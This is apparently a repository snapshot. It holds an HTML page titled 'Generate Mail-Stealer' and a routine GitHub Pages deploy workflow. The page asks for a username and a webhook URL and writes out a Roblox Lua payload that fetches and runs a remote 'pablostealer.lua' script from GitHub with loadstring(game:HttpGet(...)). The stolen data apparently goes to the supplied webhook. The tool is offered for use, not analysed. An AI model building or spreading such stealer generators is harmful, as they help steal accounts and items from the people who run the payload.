<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Coen On Top</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/default.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
<style>
  body { font-family: Arial, sans-serif; background-color: #7bc26b; text-align: center; padding: 50px; }
  .container { background-color: rgb(86, 135, 37); padding: 20px; border-radius: 8px; display: inline-block; }
  .input-field, .checkbox-group, button { margin: 10px 0; }
  button { padding: 10px 20px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
  button:hover { background-color: #0056b3; }
  #output { text-align: left; white-space: pre-wrap; }
  textarea { width: 100%; height: 150px; }
</style>
</head>
<body>
  <div class="container">
  <h1>Generate Mail-Stealer</h1>
    <div class="input-field">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username">
    </div>
    <div class="input-field">
      <label for="webhook">Webhook URL:</label>
      <input type="text" id="webhook" name="webhook">
    </div>
    <button onclick="generateOutput()">Generate</button>
    <textarea id="output"></textarea>
    <button onclick="copyToClipboard()">Copy to Clipboard</button>
  </div>

<script>
    function generateOutput() {
        var username = document.getElementById("username").value;
        var webhook = document.getElementById("webhook").value;
        var outputString = 'Username = "' + username + '"\n' + // Use actual line breaks
                           'Webhook = "' + webhook + '"\n' +
                           'loadstring(game:HttpGet("https://raw.githubusercontent.com/pablopoep/pablosteal/main/pablostealer.lua"))()';
        document.getElementById("output").value = outputString;
        hljs.highlightAll();
    }

    function copyToClipboard() {
        var copyText = document.getElementById("output");
        copyText.select();
        document.execCommand("copy");
    }
</script>

</body>
</html># Simple workflow for deploying static content to GitHub Pages
name: Deploy static content to Pages

on:
  # Runs on pushes targeting the default branch
  push:
    branches: ["main"]

  # Allows you to run this workflow manually from the Actions tab
  workflow_dispatch:

# Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages
permissions:
  contents: read
  pages: write
  id-token: write

# Allow only one concurrent deployment, skipping runs queued between the run in-progress and latest queued.
# However, do NOT cancel in-progress runs as we want to allow these production deployments to complete.
concurrency:
  group: "pages"
  cancel-in-progress: false

jobs:
  # Single deploy job since we're just deploying
  deploy:
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Setup Pages
        uses: actions/configure-pages@v4
      - name: Upload artifact
        uses: actions/upload-pages-artifact@v3
        with:
          # Upload entire repository
          path: '.'
      - name: Deploy to GitHub Pages
        id: deployment
        uses: actions/deploy-pages@v4
